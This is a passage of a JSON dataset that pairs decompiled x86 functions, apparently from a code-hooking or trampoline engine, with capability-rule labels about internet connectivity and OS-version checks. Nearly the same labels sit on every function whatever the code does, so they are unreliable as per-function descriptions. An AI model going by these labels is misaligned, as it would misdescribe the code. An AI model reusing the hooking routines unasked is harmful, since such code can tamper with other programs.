        "decompiled_code": "\nint32_t __cdecl fcn.00061b80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.000620f0(arg_8h, arg_ch, arg_10h, &var_ch, &var_4h);\n    if (var_8h == 0) {\n        fcn.00062200(var_ch, var_4h);\n    }\n    return var_8h;\n}\n",
        "token_count": 125
    },
    "00061bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061bd0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_270h;\n    uint var_26ch;\n    int32_t var_268h;\n    uint var_264h;\n    uint var_260h;\n    int32_t var_1c4h;\n    int32_t var_1c0h;\n    int32_t var_1b0h;\n    int32_t var_1a0h;\n    uint var_198h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_268h = 0x21590065;\n    }\n    else if (arg_ch == 0) {\n        var_268h = 0x21590066;\n    }\n    else if (arg_10h == NULL) {\n        var_268h = 0x21590067;\n    }\n    else {\n        var_268h = fcn.0005c850(arg_8h, arg_ch, &var_264h);\n        if (var_268h == 0) {\n            var_270h = var_264h;\n            var_4h = 0x40;\n            var_268h = fcn.00061750(&var_270h, &var_4h, 1, &var_26ch);\n            if (var_268h == 0) {\n                fcn.00060b70(&var_260h);\n                fcn.00060c10(&var_260h, 0x20);\n                fcn.00060c70(&var_260h, 0);\n                fcn.000607b0(&var_260h, var_264h, 0x40);\n                var_268h = -1;\n                do {\n                    iVar1 = fcn.00060bb0(&var_260h);\n                    if (iVar1 == 0) goto code_r0x00061d1a;\n                } while ((((var_1c4h != 0x118) || (var_1c0h != 0x8c)) || (var_1b0h != 0x25)) || (var_1a0h != 0x8f));\n                *arg_10h = var_198h;\n                var_268h = 0;\ncode_r0x00061d1a:\n                fcn.000617b0(var_270h, var_4h, var_26ch);\n            }\n        }\n    }\n    return var_268h;\n}\n",
        "token_count": 578
    },
    "00061d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00061d40(void)\n\n{\n    uint32_t *puVar1;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_18h = fcn.00062220(0xb1c67750);\n    if (var_18h == 0) {\n        puVar1 = fcn.00063aa0();\n        if (puVar1 == NULL) {\n            var_18h = 0x21590005;\n        }\n        else {\n            if ((*puVar1 < *0xb1c67788) || (*0xb1c67788 + *0xb1c6778c <= *puVar1)) {\n                var_4h = 0;\n                while ((var_4h < *0xb1c6778c - 8U &&\n                       ((((*(*0xb1c67750 + var_4h) != puVar1 || (*(*0xb1c67750 + var_4h + -2) != 0x5c7)) ||\n                         (var_10h = (*(*0xb1c67750 + var_4h + 4) - *0xb1c67788) + *0xb1c67750,  var_10h < *0xb1c67750))\n                        || (*0xb1c67750 + *0xb1c6778c <= var_10h + puVar1[2] * 4))))) {\n                    var_4h = var_4h + 1;\n                }\n            }\n            else {\n                var_10h = (*puVar1 - *0xb1c67788) + *0xb1c67750;\n            }\n            if (var_10h == 0) {\n                var_18h = 0x21590005;\n            }\n            else {\n                *0xb1c6774c = fcn.00035200(puVar1[2] << 2);\n                if (*0xb1c6774c == 0) {\n                    var_18h = 0x21590004;\n                }\n                else {\n                    fcn.0007877e(*0xb1c6774c, var_10h, puVar1[2] << 2);\n                    var_18h = 0;\n                }\n            }\n        }\n        if (var_18h != 0) {\n            fcn.00035330(*0xb1c67750);\n            *0xb1c67750 = 0;\n            fcn.00035330(*0xb1c6774c);\n            *0xb1c6774c = 0;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 628
    },
    "00061ef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00061ef0(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_140h;\n    int32_t var_13ch;\n    uint var_138h;\n    uint32_t *var_120h;\n    uint var_11ch;\n    uint32_t *var_118h;\n    uint32_t var_114h;\n    uint var_110h;\n    int32_t iStack272;\n    int32_t var_4h;\n    \n    var_120h = NULL;\n    if (arg_8h == NULL) {\n        var_13ch = 0x21590065;\n    }\n    else if (*0xb1c67754 == 0xffffffff) {\n        var_13ch = 0x21590005;\n    }\n    else if (*0xb1c67754 == 0) {\n        *0xb1c67754 = 0xffffffff;\n        var_13ch = fcn.00034830(0x10, &var_120h);\n        if (var_13ch == 0) {\n            var_118h = var_120h + 1;\n            var_13ch = 0x21590005;\n            for (var_114h = 0; var_114h < *var_120h; var_114h = var_114h + 1) {\n                iVar1 = (**0xb1bde1d0)(var_118h[var_114h * 4], &var_11ch);\n                if (iVar1 == 0) {\n                    (**0xb1bde1bc)(var_11ch, &var_138h);\n                    var_4h = fcn.00078742(*(var_118h + var_114h * 0x10 + 6), 1, &var_110h, 0x104, 0);\n                    (**0xb1bde1b4)(&var_138h);\n                    if ((((var_4h == 0) && (iStack272 != 0)) && (var_110h == 0x20)) &&\n                       (iVar1 = fcn.00078538(iStack272, 0xb1be2818, 0x20),  iVar1 == 0)) {\n                        *0xb1c67754 = var_118h[var_114h * 4];\n                        *arg_8h = *0xb1c67754;\n                        (**0xb1bde2e4)();\n                        var_13ch = 0;\n                        break;\n                    }\n                    (**0xb1bde2e4)();\n                }\n            }\n            fcn.00035330(var_120h);\n        }\n    }\n    else {\n        *arg_8h = *0xb1c67754;\n        var_13ch = 0;\n    }\n    return var_13ch;\n}\n",
        "token_count": 641
    },
    "000620f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000620f0(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    *arg_18h = 0;\n    if (arg_8h == 1) {\n        var_8h = fcn.00063aa0();\n        if (var_8h == NULL) {\n            return -1;\n        }\n    }\n    else {\n        if (arg_8h != 2) {\n            return 0x21590065;\n        }\n        iVar1 = fcn.00063ab0();\n        if (iVar1 == 0) {\n            return -1;\n        }\n        iVar2 = fcn.000622b0(arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        var_8h = iVar1 + 0x10;\n        arg_ch = arg_ch - 0x1000;\n    }\n    if (arg_ch < var_8h[2] || arg_ch == var_8h[2]) {\n        if ((*0xb1c6774c == 0) || (arg_8h != 1)) {\n            *arg_10h = *(*var_8h + arg_ch * 4);\n        }\n        else {\n            *arg_10h = *(*0xb1c6774c + arg_ch * 4);\n        }\n        var_ch = 0;\n    }\n    else {\n        var_ch = 0x21590066;\n    }\n    if (var_ch != 0) {\n        fcn.00062350(*arg_14h, *arg_18h);\n    }\n    return var_ch;\n}\n",
        "token_count": 443
    },
    "00062220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062220(uint arg_8h)\n\n{\n    int32_t var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00034830(0xb, &var_114h);\n    if (var_4h == 0) {\n        var_8h = var_114h + 4;\n        fcn.00020a20(&var_110h, 0x104, 0xb1be283c, var_114h + 0x20 + *(var_114h + 0x1e));\n        var_4h = fcn.0005c490(0, &var_110h, *(var_8h + 8), arg_8h, 0);\n        fcn.00035330(var_114h);\n    }\n    return var_4h;\n}\n",
        "token_count": 212
    },
    "000622b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000622b0(uint *arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    *arg_ch = 0;\n    var_4h = fcn.00061ef0(&var_10h);\n    if (var_4h == 0) {\n        var_8h = fcn.00035230(0x18);\n        if (var_8h == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            var_4h = (**0xb1bde1d0)(var_10h, &var_ch);\n            if (var_4h == 0) {\n                (**0xb1bde1bc)(var_ch, var_8h);\n                *arg_8h = var_ch;\n                *arg_ch = var_8h;\n            }\n            else {\n                fcn.00035330(var_8h);\n                var_4h = fcn.000785b6(var_4h);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 279
    },
    "00062350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00062350(int32_t arg_8h, uint arg_ch)\n\n{\n    if (arg_8h != 0) {\n        (**0xb1bde1b4)(arg_ch);\n        (**0xb1bde2e4)();\n        fcn.00035330(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00062380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00062380(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_1d4h;\n    int32_t var_1d0h;\n    int32_t var_1b0h;\n    uint var_1a8h;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45960;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00062380::var_10h;\n    puStack28 = &stack0xfffffd68;\n    var_27ch = 0;\n    fcn.00060b70(&fcn.00062380::var_270h);\n    fcn.00060c10(&fcn.00062380::var_270h, 0x20);\n    fcn.00060c70(&fcn.00062380::var_270h, 0);\n    iVar1 = (**0xb1bde294)(*0xb1bde264, 0x1000, 0, 0, 0);\n    if (iVar1 == 0) {\n        var_27ch = 0;\n    }\n    else {\n        var_4h = 0;\n        (**0xb1bde2a0)(iVar1, 0, 0);\n        arg_ch = (**0xb1bde0e0)(iVar1, 0, 1, 0, 0, 0x10);\n        if (arg_ch != 0) {\n            fcn.000607b0(&fcn.00062380::var_270h, arg_ch, 0x1000);\n            do {\n                iVar2 = fcn.00060bb0(0x62498);\n                if ((((iVar2 == 0) || (var_1d4h == 0x1be)) || (var_1d4h == 0x1bf)) ||\n                   (uVar3 = fcn.00060ca0(&fcn.00062380::var_270h),  0xfeb < uVar3)) goto code_r0x00062546;\n            } while (((var_1d4h != 0xf4) || (var_1d0h != 0x8c)) || (var_1b0h != 0x8d));\n            var_27ch = var_1a8h;\n        }\ncode_r0x00062546:\n        var_4h = 0xffffffff;\n        if (arg_ch != 0) {\n            (**0xb1bde0a4)(arg_ch, iVar1);\n        }\n        (**0xb1bde29c)(iVar1);\n        if (iVar1 != 0) {\n            (**0xb1bde2ac)(iVar1);\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    return var_27ch;\n}\n",
        "token_count": 751
    },
    "000625e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000625e0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t **arg_18h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_274h;\n    uint var_270h;\n    int32_t var_26ch;\n    uint var_268h;\n    int32_t *var_264h;\n    uint var_260h;\n    int32_t var_1c4h;\n    int32_t var_1c0h;\n    uint var_1bch;\n    int32_t var_1b8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        var_26ch = 0x21590065;\n    }\n    else if (arg_10h == 0) {\n        var_26ch = 0x21590066;\n    }\n    else if (arg_18h == NULL) {\n        var_26ch = 0x2159006a;\n    }\n    else {\n        var_264h = fcn.00035230(0x88);\n        if (var_264h == NULL) {\n            var_26ch = 0x21590004;\n        }\n        else {\n            fcn.00078790(var_264h, 0, 0x88);\n            arg_8h_00 = var_264h;\n            var_264h[0x21] = 1;\n            var_264h[0x1c] = 0;\n            var_264h[2] = arg_8h;\n            var_264h[1] = 0;\n            var_264h[6] = 0;\n            fcn.00060b70(&var_260h);\n            fcn.00060c10(&var_260h, 0x20);\n            fcn.00060c70(&var_260h, 0);\n            fcn.000607b0(&var_260h, arg_8h, arg_10h + 0xe);\n            var_4h = 0;\n            while ((arg_8h_00[1] < arg_10h && (iVar1 = fcn.00060bb0(&var_260h),  iVar1 != 0))) {\n                if ((var_1c4h == 0x1be) || (var_1c4h == 0x1bf)) {\n                    return 0x2159000e;\n                }\n                iVar1 = fcn.00060ca0(&var_260h);\n                var_4h = var_4h + iVar1;\n                arg_8h_00[1] = arg_8h_00[1] + iVar1;\n            }\n            var_26ch = fcn.00062d40(arg_8h_00, var_4h + 6);\n            if (var_26ch == 0) {\n                fcn.000607b0(&var_260h, arg_8h, arg_8h_00[1]);\n                arg_10h = 0;\n                var_4h = 0;\n                while ((arg_10h < arg_8h_00[1] && (iVar1 = fcn.00060bb0(&var_260h),  iVar1 != 0))) {\n                    if ((var_1c4h == 0xde) && ((var_1c0h == 0x90 && (var_1bch == '\\b')))) {\n                        iVar1 = arg_8h_00[6];\n                        iVar2 = fcn.00060ca0(&var_260h);\n                        var_26ch = fcn.00062d40(arg_8h_00, (iVar1 + 6) - iVar2);\n                        if (var_26ch != 0) goto code_r0x00062b7f;\n                        uVar5 = 0;\n                        uVar4 = 0;\n                        puVar3 = &var_260h;\n                        iVar1 = fcn.00060ca0(puVar3);\n                        var_26ch = fcn.00062ea0(*arg_8h_00 + var_4h, iVar1 + arg_8h + arg_10h + var_1b8h, puVar3, uVar4\n                                                , uVar5);\n                        if (var_26ch != 0) goto code_r0x00062b7f;\n                        var_4h = var_4h + 6;\n                    }\n                    else if (((var_1c4h == 0x232) ||\n                             ((((var_1c4h == 0xe5 || (var_1c4h == 0xe4)) || (var_1c4h == 0xe2)) ||\n                              ((var_1c4h == 0x231 || (var_1c4h == 0xe6)))))) &&\n                            ((var_1c0h == 0x90 && (var_1bch == '\\b')))) {\n                        var_26ch = fcn.00062d40(arg_8h_00, arg_8h_00[6] + 6);\n                        if (var_26ch != 0) goto code_r0x00062b7f;\n                        *(*arg_8h_00 + var_4h) = *(arg_8h + arg_10h);\n                        *(var_4h + 1 + *arg_8h_00) = (arg_8h_00[6] - var_4h) + -8;\n                        uVar5 = 0;\n                        uVar4 = 0;\n                        puVar3 = &var_260h;\n                        iVar1 = fcn.00060ca0(puVar3);\n                        var_26ch = fcn.00062ea0(*arg_8h_00 + -6 + arg_8h_00[6], iVar1 + arg_8h + arg_10h + var_1b8h, \n                                                puVar3, uVar4, uVar5);\n                        if (var_26ch != 0) goto code_r0x00062b7f;\n                        iVar1 = fcn.00060ca0(&var_260h);\n                        arg_10h = iVar1 + arg_10h;\n                        iVar1 = fcn.00060ca0(&var_260h);\n                        var_4h = iVar1 + var_4h;\n                    }\n                    else {\n                        uVar4 = fcn.00060ca0(&var_260h);\n                        fcn.0007877e(*arg_8h_00 + var_4h, arg_8h + arg_10h, uVar4);\n                        iVar1 = fcn.00060ca0(&var_260h);\n                        arg_10h = iVar1 + arg_10h;\n                        iVar1 = fcn.00060ca0(&var_260h);\n                        var_4h = iVar1 + var_4h;\n                        if (((var_1c4h == 0x18) && (var_1c0h == 0x90)) && (var_1bch == ' ')) {\n                            *(*arg_8h_00 + -4 + var_4h) = (arg_8h - *arg_8h_00) + var_1b8h + arg_ch;\n                        }\n                        if (((var_1c4h == 0xde) && (var_1c0h == 0x90)) && (var_1bch == ' ')) {\n                            *(*arg_8h_00 + -4 + var_4h) = (arg_8h - *arg_8h_00) + var_1b8h + arg_ch;\n                        }\n                        if ((var_1c4h == 0x224) && (arg_10h == 1)) {\n                            iVar1 = fcn.00034c90();\n                            if (iVar1 == 3) {\n                                **arg_8h_00 = 0x55;\n                            }\n                            else if (iVar1 == 9) {\n                                **arg_8h_00 = 0x8b;\n                            }\n                        }\n                    }\n                }\n                var_26ch = fcn.00062ea0(*arg_8h_00 + var_4h, arg_8h + arg_8h_00[1] + arg_ch, 0, 0, 0);\n                if ((var_26ch == 0) &&\n                   ((arg_14h == 0 || (var_26ch = fcn.00062de0(arg_8h, arg_8h_00[1], 0, arg_8h_00),  var_26ch == 0)))) {\n                    *arg_18h = var_264h;\n                    var_26ch = 0;\n                }\n            }\ncode_r0x00062b7f:\n            if (var_26ch != 0) {\n                fcn.00062bb0(&var_264h);\n            }\n        }\n    }\n    return var_26ch;\n}\n",
        "token_count": 2076
    },
    "00062bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00062bb0(int32_t **arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != NULL) && (*arg_8h != NULL)) {\n        arg_8h_00 = *arg_8h;\n        *arg_8h = NULL;\n        if (arg_8h_00[5] != arg_8h_00 + 0xf) {\n            fcn.00035330(arg_8h_00[5]);\n        }\n        if (*arg_8h_00 != arg_8h_00 + 0x53) {\n            fcn.00035330(*arg_8h_00);\n        }\n        fcn.00078790(arg_8h_00, 0, 0x6c);\n        fcn.00035330(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00062c40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00062c40(int32_t arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if ((arg_8h == 0) || (*(arg_8h + 8) == 0)) {\n        uVar2 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.00062fb0();\n        if (uVar1 == 0) {\n            uVar2 = 0x21590064;\n        }\n        else {\n            uVar2 = fcn.00062f20(arg_8h + 0x2cU & 0xffffff00 | uVar1, *(arg_8h + 8), 0xb1c454f0, 1, arg_8h + 0x2cU, \n                                 arg_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 212
    },
    "00062cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00062cb0(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*(arg_8h + 0x6c) == 0) {\n        **(arg_8h + 8) = **(arg_8h + 0x14);\n    }\n    else if (*(arg_8h + 0x6c) == 1) {\n        for (var_4h = 0; var_4h < *(arg_8h + 4); var_4h = var_4h + 1) {\n            *(*(arg_8h + 8) + var_4h) = *(*(arg_8h + 0x14) + *(arg_8h + 0xc) + var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00062d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00062d40(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    if (arg_ch < 0x18) {\n        *arg_8h = arg_8h + 0x53;\n    }\n    else {\n        iVar1 = fcn.00035230(arg_ch);\n        *arg_8h = iVar1;\n        if (*arg_8h == 0) {\n            return 0x21590004;\n        }\n    }\n    if ((arg_8h_00 != 0) && (arg_8h_00 != *arg_8h)) {\n        fcn.0007877e(*arg_8h, arg_8h_00, arg_8h[6]);\n    }\n    if ((arg_8h_00 != 0) && (arg_8h_00 != arg_8h + 0x53)) {\n        fcn.00035330(arg_8h_00);\n    }\n    arg_8h[6] = arg_ch;\n    return 0;\n}\n",
        "token_count": 275
    },
    "00062de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062de0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        var_8h = arg_8h;\n        *(arg_14h + 0x10) = arg_ch;\n    }\n    else {\n        var_4h = fcn.00061820(arg_8h, arg_ch, &var_8h, arg_14h + 0x10);\n        if (var_4h != 0) {\n            return var_4h;\n        }\n    }\n    if (*(arg_14h + 0x10) < 0x18) {\n        *(arg_14h + 0x14) = arg_14h + 0x3c;\n    }\n    else {\n        uVar1 = fcn.00035230(*(arg_14h + 0x10));\n        *(arg_14h + 0x14) = uVar1;\n        if (*(arg_14h + 0x14) == 0) {\n            *(arg_14h + 0x10) = 0;\n            return 0x21590004;\n        }\n    }\n    fcn.0007877e(*(arg_14h + 0x14), var_8h, *(arg_14h + 0x10));\n    *(arg_14h + 0xc) = arg_8h - var_8h;\n    return 0;\n}\n",
        "token_count": 368
    },
    "00062ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00062ea0(uchar *arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    uchar *var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_14h != NULL) {\n        *arg_8h = 0x6a;\n        arg_8h[1] = arg_18h;\n        var_4h = arg_8h + 2;\n    }\n    *var_4h = 0x68;\n    fcn.00036f40(var_4h + 1, arg_ch);\n    var_4h[5] = 0xc3;\n    if (arg_10h == 0) {\n        if (arg_14h != NULL) {\n            *arg_14h = 0;\n        }\n    }\n    else if (arg_14h != NULL) {\n        *arg_14h = var_4h + 5;\n    }\n    return 0;\n}\n",
        "token_count": 236
    },
    "00062f20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00062f20(uint arg_8h, int32_t arg_ch, uint noname_2, int32_t arg_14h, uint *arg_18h, uint arg_1ch)\n\n{\n    uchar *var_8h;\n    uint var_4h;\n    \n    var_4h = CONCAT13(arg_8h, CONCAT12(0xcd, CONCAT11(arg_1ch, 0x6a)));\n    fcn.00036f40(arg_ch, var_4h);\n    var_8h = arg_ch + 3;\n    if ((arg_14h != 0) && (arg_8h != -0x3d)) {\n        var_8h = arg_ch + 4;\n        *var_8h = 0xc3;\n    }\n    if (arg_14h == 0) {\n        if (arg_18h != NULL) {\n            *arg_18h = 0;\n        }\n    }\n    else if (arg_18h != NULL) {\n        *arg_18h = var_8h;\n    }\n    return 0;\n}\n",
        "token_count": 257
    },
    "00062fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00062fc0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c67768 == 0) {\n        *0xb1c67780 = *arg_8h;\n        *0xb1c67784 = arg_8h[1];\n        *0xb1c67788 = arg_8h[2];\n        *0xb1c6778c = arg_8h[3];\n        iVar1 = fcn.00061980();\n        if (iVar1 == 0) {\n            *0xb1c67768 = 1;\n            iVar1 = fcn.00061600();\n            if (iVar1 != 0) {\n                fcn.00063040();\n            }\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 204
    },
    "00063040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00063040(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0xb1c67768 != 0) {\n        for (var_4h = 0; var_4h < *0xb1c67760; var_4h = var_4h + 1) {\n        }\n        fcn.00035330(*0xb1c6775c);\n        fcn.00061620();\n        fcn.000619a0();\n        *0xb1c67768 = 0;\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "000630a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000630a0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_18h == NULL) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        *arg_18h = 0;\n        if (arg_ch == 0) {\n            uVar1 = 0x21590066;\n        }\n        else if (arg_10h == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (arg_14h == 0) {\n            uVar1 = 0x21590068;\n        }\n        else if (*0xb1c67768 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0xb1c67760 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00061a00(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 277
    },
    "00063130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
